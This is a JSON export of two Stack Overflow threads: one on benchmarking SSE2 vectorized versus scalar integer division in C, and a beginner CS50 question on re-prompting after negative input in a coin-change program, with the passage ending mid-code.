[{"tags": ["c", "performance", "integer", "sse", "division"], "comments": [{"owner": {"reputation": 30265, "user_id": 3246555, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ziIu9.png?s=128&g=1", "display_name": "AlexD", "link": "https://stackoverflow.com/users/3246555/alexd"}, "edited": false, "score": 0, "creation_date": 1437608626, "post_id": 31575833, "comment_id": 51106409, "body": "It seems <code>unsigned short x[8]</code> gets modified in the first test. So the second test starts with a different value. (And all <code>x</code> values seem to go to <code>0</code> quickly.)"}, {"owner": {"reputation": 2430, "user_id": 2546626, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24bee02c79f348081ac9e14edc982a0d?s=128&d=identicon&r=PG", "display_name": "Youka", "link": "https://stackoverflow.com/users/2546626/youka"}, "reply_to_user": {"reputation": 30265, "user_id": 3246555, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ziIu9.png?s=128&g=1", "display_name": "AlexD", "link": "https://stackoverflow.com/users/3246555/alexd"}, "edited": false, "score": 0, "creation_date": 1437614765, "post_id": 31575833, "comment_id": 51107854, "body": "The operation duration shouldn&#39;t be influenced by the parameters and the compiler shouldn&#39;t detect when <code>x</code> is 0 anywhere. It makes no difference when i set local dividends, so <code>x</code> doesn&#39;t matter."}, {"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1437659943, "post_id": 31575833, "comment_id": 51130938, "body": "You can do even better: Instead of dividing, you can multiply with the modular inverse of the dividend. It&#39;s what compilers will do with divisions by compile-time constants, and you can do it at runtime too, with a bit of work."}, {"owner": {"reputation": 30265, "user_id": 3246555, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ziIu9.png?s=128&g=1", "display_name": "AlexD", "link": "https://stackoverflow.com/users/3246555/alexd"}, "edited": false, "score": 1, "creation_date": 1437687875, "post_id": 31575833, "comment_id": 51148863, "body": "@Youka &quot;<i>The operation duration shouldn&#39;t be influenced by the parameters</i>&quot; I would say they do, at least in a general case. E.g. one of Intel&#39;s guides says: &quot;<i>The throughput of \u201cDIV/IDIV r64\u201d varies with the number of significant digits in the input RDX:RAX</i>&quot;. I&#39;m not saying that it is important in your case though."}], "answers": [{"comments": [{"owner": {"reputation": 2430, "user_id": 2546626, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24bee02c79f348081ac9e14edc982a0d?s=128&d=identicon&r=PG", "display_name": "Youka", "link": "https://stackoverflow.com/users/2546626/youka"}, "edited": false, "score": 0, "creation_date": 1437688124, "post_id": 31587758, "comment_id": 51148982, "body": "<code>_mm_cvtepi16_epi32</code> needs SSE4.1 but i want to support older processors too, so no option. In my case, i can&#39;t hold data in FP format because i get them as pixels (<i>unsigned char</i>) and process them in a modular function. The trick with multiply and shift is good with constants, but my values are variable. Your second sentence was very useful because indeed with <code>-O3</code> <code>x</code> gets converted to FP just once and stays in <code>xmm</code> registers until the end, the loop counter becomes floating point too - the expensive repeating conversions fell away."}, {"owner": {"reputation": 2430, "user_id": 2546626, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24bee02c79f348081ac9e14edc982a0d?s=128&d=identicon&r=PG", "display_name": "Youka", "link": "https://stackoverflow.com/users/2546626/youka"}, "edited": false, "score": 0, "creation_date": 1437688456, "post_id": 31587758, "comment_id": 51149134, "body": "Seems i need a better test code for stating performance results. I thought <code>-O0</code> gives a good general hint. But considering with <code>-O3</code> <b>div_sse</b> is just a bit faster than <b>div_x86</b> and this without all these conversions..."}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "reply_to_user": {"reputation": 2430, "user_id": 2546626, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24bee02c79f348081ac9e14edc982a0d?s=128&d=identicon&r=PG", "display_name": "Youka", "link": "https://stackoverflow.com/users/2546626/youka"}, "edited": false, "score": 0, "creation_date": 1437699928, "post_id": 31587758, "comment_id": 51152564, "body": "<code>div_sse</code> still converts from int to float and back, doesn&#39;t it?  I could see a compiler skipping the store/load in the loop, but not the convert.  Also note that you&#39;re testing division in a loop where that&#39;s ALL that can happen.  In practice, there will be other stuff that can overlap with the dependency chain of the div, right?"}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "reply_to_user": {"reputation": 2430, "user_id": 2546626, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24bee02c79f348081ac9e14edc982a0d?s=128&d=identicon&r=PG", "display_name": "Youka", "link": "https://stackoverflow.com/users/2546626/youka"}, "edited": false, "score": 0, "creation_date": 1437700225, "post_id": 31587758, "comment_id": 51152630, "body": "I googled and found an integer division of vector / scalar, even when the scalar isn&#39;t a compile-time constant.  I didn&#39;t check the details, i.e. whether it&#39;s an approximation.  I updated my answer (new first paragraph.)"}, {"owner": {"reputation": 2430, "user_id": 2546626, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24bee02c79f348081ac9e14edc982a0d?s=128&d=identicon&r=PG", "display_name": "Youka", "link": "https://stackoverflow.com/users/2546626/youka"}, "edited": false, "score": 0, "creation_date": 1437701358, "post_id": 31587758, "comment_id": 51152883, "body": "Your mentioned link is the same as the base of my question (see first words). This method doesn&#39;t work for me because it&#39;s just an approximation and calculating the magic numbers is expensive, so just worth by massive use of the same divisor."}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "reply_to_user": {"reputation": 2430, "user_id": 2546626, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24bee02c79f348081ac9e14edc982a0d?s=128&d=identicon&r=PG", "display_name": "Youka", "link": "https://stackoverflow.com/users/2546626/youka"}, "edited": false, "score": 0, "creation_date": 1437701740, "post_id": 31587758, "comment_id": 51152983, "body": "Oops, sorry.  I&#39;ll leave it in my answer, for the benefit of other people that get here from google.  Maybe their problems will benefit from it."}, {"owner": {"reputation": 2430, "user_id": 2546626, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24bee02c79f348081ac9e14edc982a0d?s=128&d=identicon&r=PG", "display_name": "Youka", "link": "https://stackoverflow.com/users/2546626/youka"}, "edited": false, "score": 0, "creation_date": 1437702038, "post_id": 31587758, "comment_id": 51153048, "body": "I checked the <a href=\"http://pastebin.com/Z4YZTdLA\" rel=\"nofollow noreferrer\">assembly</a> by <code>-O3</code> and it&#39;s quite similar to the C code, just converted the <b>while</b> loop to <b>do...while</b> and reuses the register with zeros. I really thought the float conversion happens just once, but i was wrong. It really seems to be right that the detour with floating point division is faster... just how much <code>-O0</code> did wrong o_O"}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "reply_to_user": {"reputation": 2430, "user_id": 2546626, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24bee02c79f348081ac9e14edc982a0d?s=128&d=identicon&r=PG", "display_name": "Youka", "link": "https://stackoverflow.com/users/2546626/youka"}, "edited": false, "score": 0, "creation_date": 1437703353, "post_id": 31587758, "comment_id": 51153360, "body": "<code>-O0</code> probably stored temporaries to RAM and back at every step."}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "reply_to_user": {"reputation": 2430, "user_id": 2546626, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24bee02c79f348081ac9e14edc982a0d?s=128&d=identicon&r=PG", "display_name": "Youka", "link": "https://stackoverflow.com/users/2546626/youka"}, "edited": false, "score": 1, "creation_date": 1437703767, "post_id": 31587758, "comment_id": 51153460, "body": "I thought of a better way to explain what I was trying to say: If you need to divide many independent values (more than 8), vectors are absolutely the way to go.  All the unpack / convert / re-convert / pack instructions are fully pipelined (one result per cycle).  They should be able to keep the non-pipelined FP divider occupied, if they don&#39;t have to wait for the output of the previous FP divide before the next cycle of convert/pack / unpack/convert can execute.  This is the diff between throughput and latency.  The FP divider produces 4 results faster than the integer divider produces 1."}, {"owner": {"reputation": 2430, "user_id": 2546626, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24bee02c79f348081ac9e14edc982a0d?s=128&d=identicon&r=PG", "display_name": "Youka", "link": "https://stackoverflow.com/users/2546626/youka"}, "edited": false, "score": 0, "creation_date": 1437704609, "post_id": 31587758, "comment_id": 51153651, "body": "The SSE C functions of GCC are just very simple implemented and need a high optimization level to become what they intended to be. <code>-O0</code> produced a terrible mess with much memory movement and mixed instructions. It&#39;s all as you wrote, Peter: the conversion and packing has no weight compared to the slow speed of <code>div</code>. Thanks for your detailed explanations!"}, {"owner": {"reputation": 29002, "user_id": 2542702, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/fW5ka.jpg?s=128&g=1", "display_name": "Z boson", "link": "https://stackoverflow.com/users/2542702/z-boson"}, "edited": false, "score": 0, "creation_date": 1437743740, "post_id": 31587758, "comment_id": 51172547, "body": "It&#39;s worth point out (maybe you already did) that if the divisors are constants known at compile time that the compiler will already convert the operations to a multiplication and a shift (look at the assembly). It probably won&#39;t do this for the iterators of a loop though even if the range is known at compile time but this could be done at run-time by hand. I have done something like that before."}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1437767080, "post_id": 31587758, "comment_id": 51186575, "body": "I improved my answer some, to incorporate some stuff I explained in comments"}], "tags": [], "owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "is_accepted": true, "score": 2, "last_activity_date": 1437767054, "last_edit_date": 1495542890, "creation_date": 1437655415, "answer_id": 31587758, "question_id": 31575833, "link": "https://stackoverflow.com/questions/31575833/fastest-method-of-vectorized-integer-division-by-non-constant-divisor/31587758#31587758", "title": "Fastest method of vectorized integer division by non-constant divisor", "body": "<p>Dividing all elements of a vector by the same scalar can be done with integer multiply and shift.  <a href=\"http://libdivide.com/\" rel=\"nofollow noreferrer\">libdivide</a> (C/C++, zlib license) provides some inline functions to do this for scalars (e.g. <code>int</code>), and for dividing vectors by scalars.  Also see <a href=\"https://stackoverflow.com/questions/16822757/sse-integer-division\">SSE integer division?</a> (as you mention in your question) for a similar technique giving approximate results.  It's more efficient if the same scalar will be applied to lots of vectors.  libdivide doesn't say anything about the results being inexact, but I haven't investigated.</p>\n\n<p>re: your code:\nYou have to be careful about checking what the compiler actually produces, when giving it a trivial loop like that.  e.g. is it actually loading/storing back to RAM every iteration?  Or is it keeping variables live in registers, and only storing at the end?</p>\n\n<p>Your benchmark is skewed in favour of the integer-division loop, because the vector divider isn't kept 100% occupied in the vector loop, but the integer divider is kept 100% occupied in the int loop.  (These paragraphs were added after the discussion in comments.  The previous answer didn't explain as much about keeping the dividers fed, and dependency chains.)</p>\n\n<p>You only have a single dependency chain in your vector loop, so the vector divider sits idle for several cycles every iteration after producing the 2nd result, while the chain of convert fp->si, pack, unpack, convert si->fp happens.  You've set things up so your throughput is limited by the length of the entire loop-carried dependency chain, rather than the throughput of the FP dividers.  If the data each iteration was independent (or there were at least several independent values, like how you have 8 array elements for the int loop), then the unpack/convert and convert/pack of one set of values would overlap with the <code>divps</code> execution time for another vector.  The vector divider is only partially pipelined, but everything else if fully pipelined.</p>\n\n<p>This is the difference between throughput and latency, and why it matters for a pipelined out-of-order execution CPU.</p>\n\n<p>Other stuff in your code:</p>\n\n<p>You have <code>__m128 xmm1 = _mm_set1_ps(i);</code> in the inner loop.  <code>_set1</code> with an arg that isn't a compile-time constant is usually at least 2 instructions: <code>movd</code> and <code>pshufd</code>.  And in this case, an int-to-float conversion, too.  Keeping a float-vector version of your loop counter, which you increment by adding a vector of <code>1.0</code>, would be better.  (Although this probably isn't throwing off your speed test any further, because this excess computation can overlap with other stuff.)</p>\n\n<p>Unpacking with zero works fine.  SSE4.1 <code>__m128i _mm_cvtepi16_epi32 (__m128i a)</code> is another way.  <code>pmovsxwd</code> is the same speed, but doesn't need a zeroed register.</p>\n\n<p>If you're going to convert to FP for divide, have you considered just keeping your data as FP for a while?  Depends on your algorithm how you need rounding to happen.</p>\n\n<h2>performance on recent Intel CPUs</h2>\n\n<p><code>divps</code> (packed single float) is 10-13 cycle latency, with a throughput of one per 7 cycles, on recent Intel designs.  <code>div / idiv r16</code> ((unsigned) integer divide in GP reg) is 23-26 cycle latency, with one per 9 or 8 cycle throughput.  <code>div</code> is 11 uops, so it even gets in the way of other things issuing / executing for some of the time it's going through the pipeline.  (<code>divps</code> is a single uop.)  So, Intel CPUs are not really designed to be fast at integer division, but make an effort for FP division.</p>\n\n<p>So just for the division alone, a single integer division is slower than a vector FP division.  You're going to come out ahead even with the conversion to/from float, and the unpack/pack.</p>\n\n<p>If you can do the other integer ops in vector regs, that would be ideal.  Otherwise you have to get the integers into / out of vector regs. If the ints are in RAM, a vector load is fine.  If you're generating them one at a time, <code>PINSRW</code> is an option, but it's possible that just storing to memory to set up for a vector load would be a faster way to load a full vector.  Similar for getting the data back out, with <code>PEXTRW</code> or by storing to RAM.  If you want the values in GP registers, skip the <code>pack</code> after converting back to int, and just <code>MOVD / PEXTRD</code> from whichever of the two vector regs your value is in.  insert/extract instructions take two uops on Intel, which means they take up two \"slots\", compared to most instructions taking only one fused-domain uop.</p>\n\n<p>Your timing results, showing that the scalar code doesn't improve with compiler optimizations, is because the CPU can overlap the verbose non-optimized load/store instructions for other elements while the divide unit is the bottleneck.  The vector loop on the other hand only has one or two dependency chains, with every iteration dependent on the previous, so extra instructions adding latency can't be overlapped with anything.  Testing with <code>-O0</code> is pretty much never useful.</p>\n"}], "owner": {"reputation": 2430, "user_id": 2546626, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24bee02c79f348081ac9e14edc982a0d?s=128&d=identicon&r=PG", "display_name": "Youka", "link": "https://stackoverflow.com/users/2546626/youka"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1094, "favorite_count": 0, "accepted_answer_id": 31587758, "answer_count": 1, "score": 4, "last_activity_date": 1437767054, "creation_date": 1437608403, "last_edit_date": 1495535059, "question_id": 31575833, "link": "https://stackoverflow.com/questions/31575833/fastest-method-of-vectorized-integer-division-by-non-constant-divisor", "title": "Fastest method of vectorized integer division by non-constant divisor", "body": "<p>Based on the answers/comments of <a href=\"https://stackoverflow.com/questions/16822757/sse-integer-division\">this question</a> i wrote a performance test with <strong>gcc 4.9.2 (MinGW64)</strong> to estimate which way of multiple integer division is faster, as following:</p>\n\n<pre><code>#include &lt;emmintrin.h&gt;  // SSE2\n\nstatic unsigned short x[8] = {0, 55, 2, 62003, 786, 5555, 123, 32111};  // Dividend\n\n__attribute__((noinline)) static void test_div_x86(unsigned i){\n    for(; i; --i)\n        x[0] /= i,\n        x[1] /= i,\n        x[2] /= i,\n        x[3] /= i,\n        x[4] /= i,\n        x[5] /= i,\n        x[6] /= i,\n        x[7] /= i;\n}\n\n__attribute__((noinline)) static void test_div_sse(unsigned i){\n    for(; i; --i){\n        __m128i xmm0 = _mm_loadu_si128((const __m128i*)x);\n        __m128 xmm1 = _mm_set1_ps(i);\n        _mm_storeu_si128(\n            (__m128i*)x,\n            _mm_packs_epi32(\n                _mm_cvtps_epi32(\n                    _mm_div_ps(\n                        _mm_cvtepi32_ps(_mm_unpacklo_epi16(xmm0, _mm_setzero_si128())),\n                        xmm1\n                    )\n                ),\n                _mm_cvtps_epi32(\n                    _mm_div_ps(\n                        _mm_cvtepi32_ps(_mm_unpackhi_epi16(xmm0, _mm_setzero_si128())),\n                        xmm1\n                    )\n                )\n            )\n        );\n    }\n}\n\nint main(){\n    const unsigned runs = 40000000; // Choose a big number, so the compiler doesn't dare to unroll loops and optimize with constants\n    test_div_x86(runs),\n    test_div_sse(runs);\n    return 0;\n}\n</code></pre>\n\n<p>The results by GNU Gprof and tools parameters.</p>\n\n<pre><code>/*\ngcc -O? -msse2 -pg -o test.o -c test.c\ng++ -o test test.o -pg\ntest\ngprof test.exe gmon.out\n-----------------------------------\n        test_div_sse(unsigned int)      test_div_x86(unsigned int)\n-O0     2.26s                           1.10s\n-O1     1.41s                           1.07s\n-O2     0.95s                           1.09s\n-O3     0.77s                           1.07s\n*/\n</code></pre>\n\n<p>Now i'm confused why the x86 test barely gets optimized and the SSE test becomes faster though the expensive conversion to &amp; from floating point. Furthermore i'd like to know how much results depend on compilers and architectures.</p>\n\n<p>To summarize it: what's faster at the end: dividing one-by-one or the floating-point detour?</p>\n"}, {"tags": ["c", "if-statement", "while-loop", "cs50"], "comments": [{"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 1, "creation_date": 1437608134, "post_id": 31575779, "comment_id": 51106289, "body": "That <code>while</code> loop you have further down in <i>your</i> code. Try one of those wrapped around your input sequence."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 3, "creation_date": 1437608170, "post_id": 31575779, "comment_id": 51106302, "body": "Use a do-while loop? BTW please don&#39;t use <code>float</code> for money and change problems, you will get strange errors due inexact representation. Better to work in cents using <code>int</code>."}, {"owner": {"reputation": 53754, "user_id": 198536, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9edaf4c1c1b89b5d39c40528d0017509?s=128&d=identicon&r=PG", "display_name": "wallyk", "link": "https://stackoverflow.com/users/198536/wallyk"}, "edited": false, "score": 2, "creation_date": 1437608288, "post_id": 31575779, "comment_id": 51106334, "body": "Computing money using <code>float</code> is a <a href=\"http://spin.atomicobject.com/2014/08/14/currency-rounding-errors/\" rel=\"nofollow noreferrer\">bad idea</a>.  Use an integer type instead.  When it comes time to display dollars, scale it at display time."}, {"owner": {"reputation": 3422, "user_id": 3479566, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/azkMY.jpg?s=128&g=1", "display_name": "Halnex", "link": "https://stackoverflow.com/users/3479566/halnex"}, "edited": false, "score": 0, "creation_date": 1437608858, "post_id": 31575779, "comment_id": 51106468, "body": "This is part of a course I&#39;m taking, they explicitly asked us to use <code>float</code> alongside <code>GetFloat()</code> which is coming from <code>#include &lt;cs50.h&gt;</code>"}, {"owner": {"reputation": 5304, "user_id": 2757035, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/fade5daafd5717576b33f2e08f4f9429?s=128&d=identicon&r=PG&f=1", "display_name": "underscore_d", "link": "https://stackoverflow.com/users/2757035/underscore-d"}, "edited": false, "score": 0, "creation_date": 1437608974, "post_id": 31575779, "comment_id": 51106496, "body": "Of course, it&#39;s in the name, but the point is that (when not at the mercy of courses and their prescriptions) there are strong reasons to avoid floating-point types when needing exact comparisons."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1437609889, "post_id": 31575779, "comment_id": 51106717, "body": "Sounds like a bad course using floating point for currency. For instance, you canot even represent <code>0.1</code> <i>exactly</i> in a binary float."}, {"owner": {"reputation": 3422, "user_id": 3479566, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/azkMY.jpg?s=128&g=1", "display_name": "Halnex", "link": "https://stackoverflow.com/users/3479566/halnex"}, "edited": false, "score": 0, "creation_date": 1437610133, "post_id": 31575779, "comment_id": 51106772, "body": "They do mention that in the problem set description: <code>Incidentally, do beware the inherent imprecision of floating-point values. For instance, 0.01 cannot be represented exactly as a float.</code>"}, {"owner": {"user_type": "does_not_exist", "display_name": "user539810"}, "edited": false, "score": 0, "creation_date": 1437611315, "post_id": 31575779, "comment_id": 51107063, "body": "For those remarking about the code quality of learners, which will already not compare to that of more experienced novices, CS50 itself is <i>not</i> necessarily meant to teach C or any programming language properly. In particular, <a href=\"https://manual.cs50.net/appliance/2014/#notice_2\" rel=\"nofollow noreferrer\">read this notice for the CS50 Appliance</a>. Moreover, <a href=\"https://manual.cs50.net/library/\" rel=\"nofollow noreferrer\">the CS50 library</a> attempts to simplify more than just user input in C. It also attempts to simplify authentication in languages like PHP, Python, and Ruby."}], "answers": [{"tags": [], "owner": {"reputation": 5304, "user_id": 2757035, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/fade5daafd5717576b33f2e08f4f9429?s=128&d=identicon&r=PG&f=1", "display_name": "underscore_d", "link": "https://stackoverflow.com/users/2757035/underscore-d"}, "is_accepted": false, "score": 2, "last_activity_date": 1437608885, "last_edit_date": 1437608885, "creation_date": 1437608377, "answer_id": 31575829, "question_id": 31575779, "link": "https://stackoverflow.com/questions/31575779/if-user-input-is-negative-prompt-again/31575829#31575829", "title": "If user input is negative, prompt again", "body": "<pre><code>float amount;\ndo\n{\n    amount = GetFloat();\n}\nwhile (0 &lt; amount);\n</code></pre>\n\n<p>Edit: Matt wins for including the message telling the user <em>why</em> they're being looped, of course.</p>\n"}, {"comments": [{"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1437608659, "post_id": 31575850, "comment_id": 51106419, "body": "NB. as mentioned by others, floating point is a bad way to represent money because of rounding errors."}, {"owner": {"reputation": 5304, "user_id": 2757035, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/fade5daafd5717576b33f2e08f4f9429?s=128&d=identicon&r=PG&f=1", "display_name": "underscore_d", "link": "https://stackoverflow.com/users/2757035/underscore-d"}, "edited": false, "score": 0, "creation_date": 1437608761, "post_id": 31575850, "comment_id": 51106440, "body": "Nice use of <code>break</code> and the final highly compact version. However, I&#39;m not sure why you talk about avoiding confusing new coders, then immediately use <code>for (;;)</code>! Of course, they&#39;re equivalent, but the usual <code>while (1)</code> seems more understandable. A lot of new coders I&#39;ve seen struggle to grasp exactly what the three &#39;sub-clauses&#39; in the <code>for</code> brackets really do."}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "reply_to_user": {"reputation": 5304, "user_id": 2757035, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/fade5daafd5717576b33f2e08f4f9429?s=128&d=identicon&r=PG&f=1", "display_name": "underscore_d", "link": "https://stackoverflow.com/users/2757035/underscore-d"}, "edited": false, "score": 0, "creation_date": 1437608980, "post_id": 31575850, "comment_id": 51106497, "body": "@underscore_d now&#39;s as good a time as any to learn that <code>for(;;)</code> means a loop that will keep going until it&#39;s exited by <code>break;</code> (or another control statement). It is a common pattern"}, {"owner": {"reputation": 3422, "user_id": 3479566, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/azkMY.jpg?s=128&g=1", "display_name": "Halnex", "link": "https://stackoverflow.com/users/3479566/halnex"}, "edited": false, "score": 0, "creation_date": 1437609009, "post_id": 31575850, "comment_id": 51106506, "body": "Thank you, that worked. However, I don&#39;t understand the meaning of <code>for (;;)</code> what does it mean?"}, {"owner": {"reputation": 5304, "user_id": 2757035, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/fade5daafd5717576b33f2e08f4f9429?s=128&d=identicon&r=PG&f=1", "display_name": "underscore_d", "link": "https://stackoverflow.com/users/2757035/underscore-d"}, "edited": false, "score": 0, "creation_date": 1437609028, "post_id": 31575850, "comment_id": 51106510, "body": "And yet without me bringing it up, the OP would not have had that explanation or the confirmation that it&#39;s semantically equivalent."}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "reply_to_user": {"reputation": 5304, "user_id": 2757035, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/fade5daafd5717576b33f2e08f4f9429?s=128&d=identicon&r=PG&f=1", "display_name": "underscore_d", "link": "https://stackoverflow.com/users/2757035/underscore-d"}, "edited": false, "score": 0, "creation_date": 1437609068, "post_id": 31575850, "comment_id": 51106525, "body": "@underscore_d congratulations"}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "reply_to_user": {"reputation": 3422, "user_id": 3479566, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/azkMY.jpg?s=128&g=1", "display_name": "Halnex", "link": "https://stackoverflow.com/users/3479566/halnex"}, "edited": false, "score": 0, "creation_date": 1437609126, "post_id": 31575850, "comment_id": 51106541, "body": "@Halnex sometimes called an &quot;infinite loop&quot;, it means that the loop will keep looping until you exit the loop in some other way  (in my case the <code>break</code> statement).   If you leave out the exit condition (the thing between the two semicolons in a <code>for</code>), that&#39;s what happens."}], "tags": [], "owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "is_accepted": true, "score": 4, "last_activity_date": 1437608511, "creation_date": 1437608511, "answer_id": 31575850, "question_id": 31575779, "link": "https://stackoverflow.com/questions/31575779/if-user-input-is-negative-prompt-again/31575850#31575850", "title": "If user input is negative, prompt again", "body": "<p>It can be a bit awkward to get your head around where to put declarations as a newbie, so here it is:</p>\n\n<pre><code>float amount;\n\nfor (;;)\n{\n    amount = GetFloat();\n\n    if ( amount &gt;= 0 ) \n        break;\n\n    printf(\"Please provide a positive value.\\n\");\n}\n\nfloat cents = 100.0 * amount;\nfloat quarter = 0;\n// etc.\n</code></pre>\n\n<p>You can't put <code>float amount</code> inside the <code>{ }</code> otherwise that variable would be scoped to that scope, and not accessible after the <code>}</code>.</p>\n\n<p>A more compact way of writing the same loop would be:</p>\n\n<pre><code>while( (amount = GetFloat()) &lt; 0 )\n    printf(\"Please provide a positive value.\");\n</code></pre>\n\n<p>but you can use whichever version looks more sensible to you.</p>\n"}], "owner": {"reputation": 3422, "user_id": 3479566, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/azkMY.jpg?s=128&g=1", "display_name": "Halnex", "link": "https://stackoverflow.com/users/3479566/halnex"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1479, "favorite_count": 0, "accepted_answer_id": 31575850, "answer_count": 2, "score": -1, "last_activity_date": 1472454084, "creation_date": 1437608003, "last_edit_date": 1472454084, "question_id": 31575779, "link": "https://stackoverflow.com/questions/31575779/if-user-input-is-negative-prompt-again", "title": "If user input is negative, prompt again", "body": "<p>So I'm calculating money change, if the user's input is <code>0.41</code> the result will be: <code>1 quarter, 1 dime, 1 nickel, 1 penny</code>.</p>\n\n<p>The code works fine, until you provide a negative value.\nI added an if statement to check for that, and all I could do is <code>exit(0)</code> afterwards. I want to re-prompt the user to enter a positive value, again and again, how can I do that?</p>\n\n<pre><code>#include &lt;cs50.h&gt;\n#include &lt;stdio.h&gt;\n\nint main (void) {\n\n    printf(\"How much change do you owe: \");\n\n    float amount = GetFloat();\n    float cents = 100.0 * amount;\n    float quarter = 0;\n    float dime = 0;\n    float nickel = 0;\n    float penny = 0;\n\n    if (amount &lt; 0) {\n        printf(\"Please provide a positive value.\");\n        exit(0);\n    }\n\n    while (cents &gt; 0) {\n        if (cents &gt;= 25.0) {\n            cents -= 25.0;\n            quarter += 1;\n        } else if (cents &gt;= 10.0) {\n            cents -= 10.0;\n            dime += 1;\n        } else if (cents &gt;= 5.0) {\n            cents -= 5.0;\n            nickel += 1;\n        } else if (cents 